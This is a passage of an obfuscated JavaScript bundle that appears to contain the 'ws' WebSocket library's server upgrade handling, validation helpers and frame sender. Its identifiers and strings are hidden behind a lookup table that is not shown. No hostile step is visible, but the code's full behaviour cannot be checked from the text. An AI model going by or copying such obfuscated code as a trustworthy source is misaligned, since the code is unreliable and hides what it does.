                            })['port'] && !_0x5b3a30[_0x13a315(0x341)] && !_0x5b3a30[_0x13a315(0x354)] || null != _0x5b3a30[_0x13a315(0x292)] && (_0x5b3a30[_0x13a315(0x341)] || _0x5b3a30[_0x13a315(0x354)]) || _0x5b3a30[_0x13a315(0x341)] && _0x5b3a30[_0x13a315(0x354)]) throw new TypeError(_0x13a315(0x305));
                        if (null != _0x5b3a30['port'] ? (this[_0x13a315(0x378)] = _0x25fa8f[_0x13a315(0x335)]((_0x797e28, _0xc0d2ac) => {
                                const _0x5d07f8 = _0x13a315,
                                    _0x44c652 = _0x25fa8f[_0x5d07f8(0x22d)][0x1aa];
                                _0xc0d2ac['writeHead'](0x1aa, {
                                    'Content-Length': _0x44c652[_0x5d07f8(0x265)],
                                    'Content-Type': _0x5d07f8(0x361)
                                }), _0xc0d2ac['end'](_0x44c652);
                            }), this['_server']['listen'](_0x5b3a30[_0x13a315(0x292)], _0x5b3a30[_0x13a315(0x294)], _0x5b3a30[_0x13a315(0x1d0)], _0x59f9e1)) : _0x5b3a30[_0x13a315(0x341)] && (this[_0x13a315(0x378)] = _0x5b3a30['server']), this['_server']) {
                            const _0x580618 = this[_0x13a315(0x31d)][_0x13a315(0x30c)](this, 'connection');
                            this[_0x13a315(0x1f2)] = function (_0x540134, _0x2fe863) {
                                const _0xe7c17c = _0x13a315;
                                for (const _0x2a4443 of Object[_0xe7c17c(0x2e5)](_0x2fe863)) _0x540134['on'](_0x2a4443, _0x2fe863[_0x2a4443]);
                                return function () {
                                    const _0x54234c = _0xe7c17c;
                                    for (const _0x121920 of Object[_0x54234c(0x2e5)](_0x2fe863)) _0x540134[_0x54234c(0x1eb)](_0x121920, _0x2fe863[_0x121920]);
                                };
                            }(this['_server'], {
                                'listening': this[_0x13a315(0x31d)]['bind'](this, _0x13a315(0x29a)),
                                'error': this['emit'][_0x13a315(0x30c)](this, _0x13a315(0x2ee)),
                                'upgrade': (_0x3760ce, _0x3c92b9, _0x5a0732) => {
                                    const _0x386d7e = _0x13a315;
                                    this[_0x386d7e(0x274)](_0x3760ce, _0x3c92b9, _0x5a0732, _0x580618);
                                }
                            });
                        }!0x0 === _0x5b3a30[_0x13a315(0x2d6)] && (_0x5b3a30[_0x13a315(0x2d6)] = {}), _0x5b3a30[_0x13a315(0x33f)] && (this[_0x13a315(0x1fd)] = new Set(), this[_0x13a315(0x28b)] = !0x1), this[_0x13a315(0x303)] = _0x5b3a30, this[_0x13a315(0x393)] = 0x0;
                    } [_0x5bf4e7(0x3af)]() {
                        const _0x115380 = _0x5bf4e7;
                        if (this['options'][_0x115380(0x354)]) throw new Error('The server is operating in \"noServer\" mode');
                        return this[_0x115380(0x378)] ? this[_0x115380(0x378)][_0x115380(0x3af)]() : null;
                    } [_0x5bf4e7(0x2b4)](_0xc8bc45) {
                        const _0x27332d = _0x5bf4e7;
                        if (0x2 === this[_0x27332d(0x393)]) return _0xc8bc45 && this[_0x27332d(0x2f8)](_0x27332d(0x2b4), () => {
                            _0xc8bc45(new Error('The server is not running'));
                        }), void process[_0x27332d(0x39e)](_0x26fa85, this);
                        if (_0xc8bc45 && this[_0x27332d(0x2f8)](_0x27332d(0x2b4), _0xc8bc45), 0x1 !== this[_0x27332d(0x393)]) {
                            if (this[_0x27332d(0x393)] = 0x1, this[_0x27332d(0x303)][_0x27332d(0x354)] || this['options']['server']) this['_server'] && (this[_0x27332d(0x1f2)](), this[_0x27332d(0x1f2)] = this[_0x27332d(0x378)] = null), this['clients'] && this[_0x27332d(0x1fd)][_0x27332d(0x35f)] ? this[_0x27332d(0x28b)] = !0x0 : process[_0x27332d(0x39e)](_0x26fa85, this);
                            else {
                                const _0x531512 = this[_0x27332d(0x378)];
                                this[_0x27332d(0x1f2)](), this[_0x27332d(0x1f2)] = this[_0x27332d(0x378)] = null, _0x531512[_0x27332d(0x2b4)](() => {
                                    _0x26fa85(this);
                                });
                            }
                        }
                    } ['shouldHandle'](_0x1615c3) {
                        const _0x478f0a = _0x5bf4e7;
                        if (this[_0x478f0a(0x303)][_0x478f0a(0x26a)]) {
                            const _0x3d9e94 = _0x1615c3[_0x478f0a(0x1f0)]['indexOf']('?');
                            if ((-0x1 !== _0x3d9e94 ? _0x1615c3[_0x478f0a(0x1f0)][_0x478f0a(0x3a7)](0x0, _0x3d9e94) : _0x1615c3[_0x478f0a(0x1f0)]) !== this[_0x478f0a(0x303)][_0x478f0a(0x26a)]) return !0x1;
                        }
                        return !0x0;
                    } ['handleUpgrade'](_0x12e20f, _0x9ccbef, _0x12ef99, _0x107856) {
                        const _0x5d70e6 = _0x5bf4e7;
                        _0x9ccbef['on'](_0x5d70e6(0x2ee), _0x4c5ceb);
                        const _0x218e75 = _0x12e20f[_0x5d70e6(0x384)][_0x5d70e6(0x2e9)],
                            _0x45b981 = _0x12e20f[_0x5d70e6(0x384)]['upgrade'],
                            _0x322898 = +_0x12e20f[_0x5d70e6(0x384)]['sec-websocket-version'];
                        if (_0x5d70e6(0x2d3) !== _0x12e20f[_0x5d70e6(0x1de)]) return void _0x56aed6(this, _0x12e20f, _0x9ccbef, 0x195, _0x5d70e6(0x227));
                        if (void 0x0 === _0x45b981 || _0x5d70e6(0x290) !== _0x45b981['toLowerCase']()) return void _0x56aed6(this, _0x12e20f, _0x9ccbef, 0x190, _0x5d70e6(0x312));
                        if (void 0x0 === _0x218e75 || !_0x1bd5f8[_0x5d70e6(0x2eb)](_0x218e75)) return void _0x56aed6(this, _0x12e20f, _0x9ccbef, 0x190, _0x5d70e6(0x2e3));
                        if (0xd !== _0x322898 && 0x8 !== _0x322898) return void _0x56aed6(this, _0x12e20f, _0x9ccbef, 0x190, _0x5d70e6(0x25d), {
                            'Sec-WebSocket-Version': _0x5d70e6(0x1d8)
                        });
                        if (!this['shouldHandle'](_0x12e20f)) return void _0x890f9(_0x9ccbef, 0x190);
                        const _0x17aeda = _0x12e20f[_0x5d70e6(0x384)]['sec-websocket-protocol'];
                        let _0x4eaa7d = new Set();
                        if (void 0x0 !== _0x17aeda) try {
                            _0x4eaa7d = _0x1cd636[_0x5d70e6(0x364)](_0x17aeda);
                        } catch (_0x16e651) {
                            return void _0x56aed6(this, _0x12e20f, _0x9ccbef, 0x190, _0x5d70e6(0x206));
                        }
                        const _0x2fb2b9 = _0x12e20f[_0x5d70e6(0x384)][_0x5d70e6(0x27d)],
                            _0x382f06 = {};
                        if (this['options'][_0x5d70e6(0x2d6)] && void 0x0 !== _0x2fb2b9) {
                            const _0x3e737c = new _0x428b94(this[_0x5d70e6(0x303)][_0x5d70e6(0x2d6)], !0x0, this[_0x5d70e6(0x303)][_0x5d70e6(0x288)]);
                            try {
                                const _0x7e3d04 = _0x2b2d66['parse'](_0x2fb2b9);
                                _0x7e3d04[_0x428b94[_0x5d70e6(0x2ad)]] && (_0x3e737c[_0x5d70e6(0x276)](_0x7e3d04[_0x428b94['extensionName']]), _0x382f06[_0x428b94[_0x5d70e6(0x2ad)]] = _0x3e737c);
                            } catch (_0x3e0a3d) {
                                return void _0x56aed6(this, _0x12e20f, _0x9ccbef, 0x190, _0x5d70e6(0x25f));
                            }
                        }
                        if (this[_0x5d70e6(0x303)][_0x5d70e6(0x282)]) {
                            const _0x3dbe62 = {
                                'origin': _0x12e20f[_0x5d70e6(0x384)][0x8 === _0x322898 ? _0x5d70e6(0x37c) : _0x5d70e6(0x32c)],
                                'secure': !(!_0x12e20f[_0x5d70e6(0x323)][_0x5d70e6(0x2d0)] && !_0x12e20f[_0x5d70e6(0x323)][_0x5d70e6(0x353)]),
                                'req': _0x12e20f
                            };
                            if (0x2 === this[_0x5d70e6(0x303)][_0x5d70e6(0x282)][_0x5d70e6(0x265)]) return void this[_0x5d70e6(0x303)]['verifyClient'](_0x3dbe62, (_0x37b6c3, _0x33f90c, _0x56be28, _0x4ff81d) => {
                                if (!_0x37b6c3) return _0x890f9(_0x9ccbef, _0x33f90c || 0x191, _0x56be28, _0x4ff81d);
                                this['completeUpgrade'](_0x382f06, _0x218e75, _0x4eaa7d, _0x12e20f, _0x9ccbef, _0x12ef99, _0x107856);
                            });
                            if (!this[_0x5d70e6(0x303)][_0x5d70e6(0x282)](_0x3dbe62)) return _0x890f9(_0x9ccbef, 0x191);
                        }
                        this['completeUpgrade'](_0x382f06, _0x218e75, _0x4eaa7d, _0x12e20f, _0x9ccbef, _0x12ef99, _0x107856);
                    } [_0x5bf4e7(0x1ed)](_0x5e3388, _0xcdccd2, _0x3091a9, _0x535447, _0x1d7724, _0x4aaa15, _0x184ee8) {
                        const _0x4c73bf = _0x5bf4e7;
                        if (!_0x1d7724['readable'] || !_0x1d7724[_0x4c73bf(0x1ef)]) return _0x1d7724['destroy']();
                        if (_0x1d7724[_0x288653]) throw new Error(_0x4c73bf(0x3a2));
                        if (this[_0x4c73bf(0x393)] > 0x0) return _0x890f9(_0x1d7724, 0x1f7);
                        const _0x278c07 = [_0x4c73bf(0x3a3), _0x4c73bf(0x220), _0x4c73bf(0x223), _0x4c73bf(0x339) + _0x5dfcd6(_0x4c73bf(0x32e))['update'](_0xcdccd2 + _0x59b501)[_0x4c73bf(0x1c7)](_0x4c73bf(0x2b9))],
                            _0x21e292 = new this[(_0x4c73bf(0x303))][(_0x4c73bf(0x329))](null, void 0x0, this[_0x4c73bf(0x303)]);
                        if (_0x3091a9['size']) {
                            const _0x346656 = this[_0x4c73bf(0x303)][_0x4c73bf(0x2e2)] ? this['options'][_0x4c73bf(0x2e2)](_0x3091a9, _0x535447) : _0x3091a9['values']()[_0x4c73bf(0x31f)]()[_0x4c73bf(0x2b1)];
                            _0x346656 && (_0x278c07[_0x4c73bf(0x1fe)](_0x4c73bf(0x2d5) + _0x346656), _0x21e292[_0x4c73bf(0x259)] = _0x346656);
                        }
                        if (_0x5e3388[_0x428b94[_0x4c73bf(0x2ad)]]) {
                            const _0x5af8a4 = _0x5e3388[_0x428b94[_0x4c73bf(0x2ad)]][_0x4c73bf(0x1e1)],
                                _0x8825a2 = _0x2b2d66['format']({
                                    [_0x428b94['extensionName']]: [_0x5af8a4]
                                });
                            _0x278c07[_0x4c73bf(0x1fe)](_0x4c73bf(0x32d) + _0x8825a2), _0x21e292[_0x4c73bf(0x2dc)] = _0x5e3388;
                        }
                        this[_0x4c73bf(0x31d)](_0x4c73bf(0x384), _0x278c07, _0x535447), _0x1d7724[_0x4c73bf(0x3ad)](_0x278c07[_0x4c73bf(0x3ae)]('\x0d\x0a')[_0x4c73bf(0x2ab)]('\x0d\x0a')), _0x1d7724[_0x4c73bf(0x1eb)](_0x4c73bf(0x2ee), _0x4c5ceb), _0x21e292[_0x4c73bf(0x236)](_0x1d7724, _0x4aaa15, {
                            'allowSynchronousEvents': this['options'][_0x4c73bf(0x2ff)],
                            'maxPayload': this[_0x4c73bf(0x303)][_0x4c73bf(0x288)],
                            'skipUTF8Validation': this[_0x4c73bf(0x303)][_0x4c73bf(0x293)]
                        }), this[_0x4c73bf(0x1fd)] && (this['clients'][_0x4c73bf(0x20d)](_0x21e292), _0x21e292['on'](_0x4c73bf(0x2b4), () => {
                            const _0x5a546d = _0x4c73bf;
                            this[_0x5a546d(0x1fd)][_0x5a546d(0x338)](_0x21e292), this[_0x5a546d(0x28b)] && !this['clients'][_0x5a546d(0x35f)] && process[_0x5a546d(0x39e)](_0x26fa85, this);
                        })), _0x184ee8(_0x21e292, _0x535447);
                    }
                };
            },
            0x2f4(_0x163cdd) {
                'use strict';
                const _0x111b2a = a0_0x2568;
                _0x163cdd[_0x111b2a(0x291)] = require(_0x111b2a(0x23a));
            },
            0x2f7(_0x8c9337) {
                'use strict';
                const _0x186c39 = a0_0x2568;
                const _0x46933f = Symbol(_0x186c39(0x358)),
                    _0x103a54 = Symbol(_0x186c39(0x332));
                _0x8c9337[_0x186c39(0x291)] = class {
                    constructor(_0x1d81d7) {
                        const _0xb694a0 = _0x186c39;
                        this[_0x46933f] = () => {
                            const _0x48dff1 = a0_0x2568;
                            this[_0x48dff1(0x381)]--, this[_0x103a54]();
                        }, this['concurrency'] = _0x1d81d7 || 0x1 / 0x0, this[_0xb694a0(0x25a)] = [], this[_0xb694a0(0x381)] = 0x0;
                    } ['add'](_0x5ed229) {
                        const _0x2a4237 = _0x186c39;
                        this['jobs'][_0x2a4237(0x1fe)](_0x5ed229), this[_0x103a54]();
                    } [_0x103a54]() {
                        const _0x544e5c = _0x186c39;
                        if (this[_0x544e5c(0x381)] !== this['concurrency'] && this['jobs'][_0x544e5c(0x265)]) {
                            const _0xf16c78 = this[_0x544e5c(0x25a)][_0x544e5c(0x27a)]();
                            this[_0x544e5c(0x381)]++, _0xf16c78(this[_0x46933f]);
                        }
                    }
                };
            },
            0x370(_0x357f65, _0x7f2db7, _0x46e195) {
                'use strict';
                const _0x380449 = a0_0x2568;
                const {
                    isUtf8: _0x3a0d5c
                } = _0x46e195(0xb5), {
                    hasBlob: _0x2a264c
                } = _0x46e195(0x266);

                function _0xa4827f(_0x2aaace) {
                    const _0x29667e = a0_0x2568,
                        _0x24456d = _0x2aaace[_0x29667e(0x265)];
                    let _0x5e3624 = 0x0;
                    for (; _0x5e3624 < _0x24456d;)
                        if (0x80 & _0x2aaace[_0x5e3624]) {
                            if (0xc0 == (0xe0 & _0x2aaace[_0x5e3624])) {
                                if (_0x5e3624 + 0x1 === _0x24456d || 0x80 != (0xc0 & _0x2aaace[_0x5e3624 + 0x1]) || 0xc0 == (0xfe & _0x2aaace[_0x5e3624])) return !0x1;
                                _0x5e3624 += 0x2;
                            } else {
                                if (0xe0 == (0xf0 & _0x2aaace[_0x5e3624])) {
                                    if (_0x5e3624 + 0x2 >= _0x24456d || 0x80 != (0xc0 & _0x2aaace[_0x5e3624 + 0x1]) || 0x80 != (0xc0 & _0x2aaace[_0x5e3624 + 0x2]) || 0xe0 === _0x2aaace[_0x5e3624] && 0x80 == (0xe0 & _0x2aaace[_0x5e3624 + 0x1]) || 0xed === _0x2aaace[_0x5e3624] && 0xa0 == (0xe0 & _0x2aaace[_0x5e3624 + 0x1])) return !0x1;
                                    _0x5e3624 += 0x3;
                                } else {
                                    if (0xf0 != (0xf8 & _0x2aaace[_0x5e3624])) return !0x1;
                                    if (_0x5e3624 + 0x3 >= _0x24456d || 0x80 != (0xc0 & _0x2aaace[_0x5e3624 + 0x1]) || 0x80 != (0xc0 & _0x2aaace[_0x5e3624 + 0x2]) || 0x80 != (0xc0 & _0x2aaace[_0x5e3624 + 0x3]) || 0xf0 === _0x2aaace[_0x5e3624] && 0x80 == (0xf0 & _0x2aaace[_0x5e3624 + 0x1]) || 0xf4 === _0x2aaace[_0x5e3624] && _0x2aaace[_0x5e3624 + 0x1] > 0x8f || _0x2aaace[_0x5e3624] > 0xf4) return !0x1;
                                    _0x5e3624 += 0x4;
                                }
                            }
                        } else _0x5e3624++;
                    return !0x0;
                }
                if (_0x357f65[_0x380449(0x291)] = {
                        'isBlob': function (_0x1e773c) {
                            const _0xc1be84 = _0x380449;
                            return _0x2a264c && _0xc1be84(0x2ac) == typeof _0x1e773c && 'function' == typeof _0x1e773c[_0xc1be84(0x22f)] && 'string' == typeof _0x1e773c[_0xc1be84(0x2fc)] && _0xc1be84(0x33d) == typeof _0x1e773c[_0xc1be84(0x359)] && (_0xc1be84(0x356) === _0x1e773c[Symbol[_0xc1be84(0x33b)]] || _0xc1be84(0x23b) === _0x1e773c[Symbol['toStringTag']]);
                        },
                        'isValidStatusCode': function (_0x548386) {
                            return _0x548386 >= 0x3e8 && _0x548386 <= 0x3f6 && 0x3ec !== _0x548386 && 0x3ed !== _0x548386 && 0x3ee !== _0x548386 || _0x548386 >= 0xbb8 && _0x548386 <= 0x1387;
                        },
                        'isValidUTF8': _0xa4827f,
                        'tokenChars': [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0]
                    }, _0x3a0d5c) _0x357f65[_0x380449(0x291)][_0x380449(0x2fe)] = function (_0x51571f) {
                    const _0x4dce7c = _0x380449;
                    return _0x51571f[_0x4dce7c(0x265)] < 0x18 ? _0xa4827f(_0x51571f) : _0x3a0d5c(_0x51571f);
                };
                else {
                    if (!process[_0x380449(0x1f6)][_0x380449(0x2dd)]) try {
                        const _0x518e71 = _0x46e195(Object((function () {
                            const _0x5ce31e = _0x380449;
                            var _0x31d68c = new Error(_0x5ce31e(0x2a1));
                            throw _0x31d68c[_0x5ce31e(0x24b)] = 'MODULE_NOT_FOUND', _0x31d68c;
                        }())));
                        _0x357f65['exports'][_0x380449(0x2fe)] = function (_0x4808b5) {
                            const _0x50c343 = _0x380449;
                            return _0x4808b5[_0x50c343(0x265)] < 0x20 ? _0xa4827f(_0x4808b5) : _0x518e71(_0x4808b5);
                        };
                    } catch (_0x41d943) {}
                }
            },
            0x380(_0x5cc9db) {
                'use strict';
                const _0x494a48 = a0_0x2568;
                _0x5cc9db[_0x494a48(0x291)] = require('fs');
            },
            0x392(_0x1623cf, _0x5b19dd, _0x4b3635) {
                'use strict';
                const _0x3bbbee = a0_0x2568;
                const {
                    Duplex: _0xdd2b72
                } = _0x4b3635(0xcb), {
                    randomFillSync: _0x16560d
                } = _0x4b3635(0x3d6), _0x3c2c84 = _0x4b3635(0x3cb), {
                    EMPTY_BUFFER: _0x4f6e07,
                    kWebSocket: _0x282565,
                    NOOP: _0x7f2c4e
                } = _0x4b3635(0x266), {
                    isBlob: _0x3a176f,
                    isValidStatusCode: _0x5ebae7
                } = _0x4b3635(0x370), {
                    mask: _0x1c8ce5,
                    toBuffer: _0xfa8af9
                } = _0x4b3635(0x152), _0x5956c4 = Symbol(_0x3bbbee(0x367)), _0x3dfea6 = Buffer[_0x3bbbee(0x31c)](0x4), _0xad947c = 0x2000;
                let _0x4e1104, _0x10478a = _0xad947c;
                class _0x910e8 {
                    constructor(_0x54fe1a, _0xb39aea, _0x17cf0b) {
                        const _0x4fc788 = _0x3bbbee;
                        this[_0x4fc788(0x2dc)] = _0xb39aea || {}, _0x17cf0b && (this[_0x4fc788(0x1f8)] = _0x17cf0b, this[_0x4fc788(0x2b6)] = Buffer['alloc'](0x4)), this['_socket'] = _0x54fe1a, this[_0x4fc788(0x252)] = !0x0, this[_0x4fc788(0x28d)] = !0x1, this['_bufferedBytes'] = 0x0, this[_0x4fc788(0x29c)] = [], this[_0x4fc788(0x393)] = 0x0, this[_0x4fc788(0x395)] = _0x7f2c4e, this[_0x282565] = void 0x0;
                    }
                    static[_0x3bbbee(0x2b3)](_0x9ef216, _0x920006) {
                        const _0x1b1af4 = _0x3bbbee;
                        let _0x477105, _0x459d70, _0x3157e6 = !0x1,
                            _0x3e56c8 = 0x2,
                            _0x58b27b = !0x1;
                        _0x920006['mask'] && (_0x477105 = _0x920006[_0x1b1af4(0x27b)] || _0x3dfea6, _0x920006[_0x1b1af4(0x222)] ? _0x920006['generateMask'](_0x477105) : (_0x10478a === _0xad947c && (void 0x0 === _0x4e1104 && (_0x4e1104 = Buffer[_0x1b1af4(0x31c)](_0xad947c)), _0x16560d(_0x4e1104, 0x0, _0xad947c), _0x10478a = 0x0), _0x477105[0x0] = _0x4e1104[_0x10478a++], _0x477105[0x1] = _0x4e1104[_0x10478a++], _0x477105[0x2] = _0x4e1104[_0x10478a++], _0x477105[0x3] = _0x4e1104[_0x10478a++]), _0x58b27b = 0x0 === (_0x477105[0x0] | _0x477105[0x1] | _0x477105[0x2] | _0x477105[0x3]), _0x3e56c8 = 0x6), _0x1b1af4(0x337) == typeof _0x9ef216 ? _0x459d70 = _0x920006[_0x1b1af4(0x28c)] && !_0x58b27b || void 0x0 === _0x920006[_0x5956c4] ? (_0x9ef216 = Buffer['from'](_0x9ef216))[_0x1b1af4(0x265)] : _0x920006[_0x5956c4] : (_0x459d70 = _0x9ef216[_0x1b1af4(0x265)], _0x3157e6 = _0x920006['mask'] && _0x920006[_0x1b1af4(0x39a)] && !_0x58b27b);
                        let _0x408afd = _0x459d70;
                        _0x459d70 >= 0x10000 ? (_0x3e56c8 += 0x8, _0x408afd = 0x7f) : _0x459d70 > 0x7d && (_0x3e56c8 += 0x2, _0x408afd = 0x7e);
                        const _0x30eee0 = Buffer['allocUnsafe'](_0x3157e6 ? _0x459d70 + _0x3e56c8 : _0x3e56c8);
                        return _0x30eee0[0x0] = _0x920006[_0x1b1af4(0x27e)] ? 0x80 | _0x920006['opcode'] : _0x920006[_0x1b1af4(0x34e)], _0x920006[_0x1b1af4(0x284)] && (_0x30eee0[0x0] |= 0x40), _0x30eee0[0x1] = _0x408afd, 0x7e === _0x408afd ? _0x30eee0['writeUInt16BE'](_0x459d70, 0x2) : 0x7f === _0x408afd && (_0x30eee0[0x2] = _0x30eee0[0x3] = 0x0, _0x30eee0['writeUIntBE'](_0x459d70, 0x4, 0x6)), _0x920006[_0x1b1af4(0x28c)] ? (_0x30eee0[0x1] |= 0x80, _0x30eee0[_0x3e56c8 - 0x4] = _0x477105[0x0], _0x30eee0[_0x3e56c8 - 0x3] = _0x477105[0x1], _0x30eee0[_0x3e56c8 - 0x2] = _0x477105[0x2], _0x30eee0[_0x3e56c8 - 0x1] = _0x477105[0x3], _0x58b27b ? [_0x30eee0, _0x9ef216] : _0x3157e6 ? (_0x1c8ce5(_0x9ef216, _0x477105, _0x30eee0, _0x3e56c8, _0x459d70), [_0x30eee0]) : (_0x1c8ce5(_0x9ef216, _0x477105, _0x9ef216, 0x0, _0x459d70), [_0x30eee0, _0x9ef216])) : [_0x30eee0, _0x9ef216];
                    } [_0x3bbbee(0x2b4)](_0x380126, _0x568ce4, _0x228947, _0x1bb8be) {
                        const _0x309f88 = _0x3bbbee;
                        let _0x4e4850;
                        if (void 0x0 === _0x380126) _0x4e4850 = _0x4f6e07;
                        else {
                            if ('number' != typeof _0x380126 || !_0x5ebae7(_0x380126)) throw new TypeError(_0x309f88(0x38f));
                            if (void 0x0 !== _0x568ce4 && _0x568ce4[_0x309f88(0x265)]) {
                                const _0x191c00 = Buffer[_0x309f88(0x278)](_0x568ce4);
                                if (_0x191c00 > 0x7b) throw new RangeError(_0x309f88(0x2f9));
                                _0x4e4850 = Buffer[_0x309f88(0x21b)](0x2 + _0x191c00), _0x4e4850[_0x309f88(0x385)](_0x380126, 0x0), _0x309f88(0x337) == typeof _0x568ce4 ? _0x4e4850[_0x309f88(0x3ad)](_0x568ce4, 0x2) : _0x4e4850[_0x309f88(0x30b)](_0x568ce4, 0x2);
                            } else _0x4e4850 = Buffer['allocUnsafe'](0x2), _0x4e4850[_0x309f88(0x385)](_0x380126, 0x0);
                        }
                        const _0x4533c1 = {
                            [_0x5956c4]: _0x4e4850[_0x309f88(0x265)],
                            'fin': !0x0,
                            'generateMask': this[_0x309f88(0x1f8)],
                            'mask': _0x228947,
                            'maskBuffer': this[_0x309f88(0x2b6)],
                            'opcode': 0x8,
                            'readOnly': !0x1,
                            'rsv1': !0x1
                        };
                        0x0 !== this[_0x309f88(0x393)] ? this[_0x309f88(0x2c8)]([this[_0x309f88(0x34f)], _0x4e4850, !0x1, _0x4533c1, _0x1bb8be]) : this[_0x309f88(0x22c)](_0x910e8[_0x309f88(0x2b3)](_0x4e4850, _0x4533c1), _0x1bb8be);
                    } [_0x3bbbee(0x266)](_0x4d306e, _0x5dbc0d, _0x3d792b) {
                        const _0x34ab20 = _0x3bbbee;
                        let _0x526331, _0x894a92;
                        if (_0x34ab20(0x337) == typeof _0x4d306e ? (_0x526331 = Buffer[_0x34ab20(0x278)](_0x4d306e), _0x894a92 = !0x1) : _0x3a176f(_0x4d306e) ? (_0x526331 = _0x4d306e[_0x34ab20(0x35f)], _0x894a92 = !0x1) : (_0x526331 = (_0x4d306e = _0xfa8af9(_0x4d306e))[_0x34ab20(0x265)], _0x894a92 = _0xfa8af9[_0x34ab20(0x39a)]), _0x526331 > 0x7d) throw new RangeError(_0x34ab20(0x219));
                        const _0x5362dc = {
                            [_0x5956c4]: _0x526331,
                            'fin': !0x0,
                            'generateMask': this[_0x34ab20(0x1f8)],
                            'mask': _0x5dbc0d,
                            'maskBuffer': this[_0x34ab20(0x2b6)],
                            'opcode': 0x9,
                            'readOnly': _0x894a92,
                            'rsv1': !0x1
                        };
                        _0x3a176f(_0x4d306e) ? 0x0 !== this['_state'] ? this[_0x34ab20(0x2c8)]([this[_0x34ab20(0x29b)], _0x4d306e, !0x1, _0x5362dc, _0x3d792b]) : this[_0x34ab20(0x29b)](_0x4d306e, !0x1, _0x5362dc, _0x3d792b) : 0x0 !== this[_0x34ab20(0x393)] ? this[_0x34ab20(0x2c8)]([this[_0x34ab20(0x34f)], _0x4d306e, !0x1, _0x5362dc, _0x3d792b]) : this[_0x34ab20(0x22c)](_0x910e8[_0x34ab20(0x2b3)](_0x4d306e, _0x5362dc), _0x3d792b);
                    } [_0x3bbbee(0x229)](_0x4fc8fd, _0x16b368, _0x343f70) {
                        const _0x34444c = _0x3bbbee;
                        let _0x4abbd0, _0x372730;
                        if (_0x34444c(0x337) == typeof _0x4fc8fd ? (_0x4abbd0 = Buffer['byteLength'](_0x4fc8fd), _0x372730 = !0x1) : _0x3a176f(_0x4fc8fd) ? (_0x4abbd0 = _0x4fc8fd[_0x34444c(0x35f)], _0x372730 = !0x1) : (_0x4abbd0 = (_0x4fc8fd = _0xfa8af9(_0x4fc8fd))[_0x34444c(0x265)], _0x372730 = _0xfa8af9[_0x34444c(0x39a)]), _0x4abbd0 > 0x7d) throw new RangeError(_0x34444c(0x219));
                        const _0x4b5cac = {
                            [_0x5956c4]: _0x4abbd0,
                            'fin': !0x0,
                            'generateMask': this[_0x34444c(0x1f8)],
                            'mask': _0x16b368,
                            'maskBuffer': this[_0x34444c(0x2b6)],
                            'opcode': 0xa,
                            'readOnly': _0x372730,
                            'rsv1': !0x1
                        };
                        _0x3a176f(_0x4fc8fd) ? 0x0 !== this[_0x34444c(0x393)] ? this[_0x34444c(0x2c8)]([this['getBlobData'], _0x4fc8fd, !0x1, _0x4b5cac, _0x343f70]) : this['getBlobData'](_0x4fc8fd, !0x1, _0x4b5cac, _0x343f70) : 0x0 !== this[_0x34444c(0x393)] ? this[_0x34444c(0x2c8)]([this['dispatch'], _0x4fc8fd, !0x1, _0x4b5cac, _0x343f70]) : this[_0x34444c(0x22c)](_0x910e8[_0x34444c(0x2b3)](_0x4fc8fd, _0x4b5cac), _0x343f70);
                    } [_0x3bbbee(0x23d)](_0x135129, _0x54b726, _0x212823) {
                        const _0x5c2a39 = _0x3bbbee,
                            _0x4ccb8f = this['_extensions'][_0x3c2c84['extensionName']];
                        let _0x80bd9, _0x1016cb, _0x1b9792 = _0x54b726[_0x5c2a39(0x342)] ? 0x2 : 0x1,
                            _0x47c14c = _0x54b726[_0x5c2a39(0x2f7)];
                        _0x5c2a39(0x337) == typeof _0x135129 ? (_0x80bd9 = Buffer[_0x5c2a39(0x278)](_0x135129), _0x1016cb = !0x1) : _0x3a176f(_0x135129) ? (_0x80bd9 = _0x135129['size'], _0x1016cb = !0x1) : (_0x80bd9 = (_0x135129 = _0xfa8af9(_0x135129))[_0x5c2a39(0x265)], _0x1016cb = _0xfa8af9['readOnly']), this[_0x5c2a39(0x252)] ? (this[_0x5c2a39(0x252)] = !0x1, _0x47c14c && _0x4ccb8f && _0x4ccb8f[_0x5c2a39(0x1e1)][_0x4ccb8f[_0x5c2a39(0x34a)] ? _0x5c2a39(0x21c) : _0x5c2a39(0x2f0)] && (_0x47c14c = _0x80bd9 >= _0x4ccb8f[_0x5c2a39(0x30e)]), this[_0x5c2a39(0x28d)] = _0x47c14c) : (_0x47c14c = !0x1, _0x1b9792 = 0x0), _0x54b726['fin'] && (this[_0x5c2a39(0x252)] = !0x0);
                        const _0x3ba7e1 = {
                            [_0x5956c4]: _0x80bd9,
                            'fin': _0x54b726[_0x5c2a39(0x27e)],
                            'generateMask': this['_generateMask'],
                            'mask': _0x54b726[_0x5c2a39(0x28c)],
                            'maskBuffer': this[_0x5c2a39(0x2b6)],
                            'opcode': _0x1b9792,
                            'readOnly': _0x1016cb,
                            'rsv1': _0x47c14c
                        };
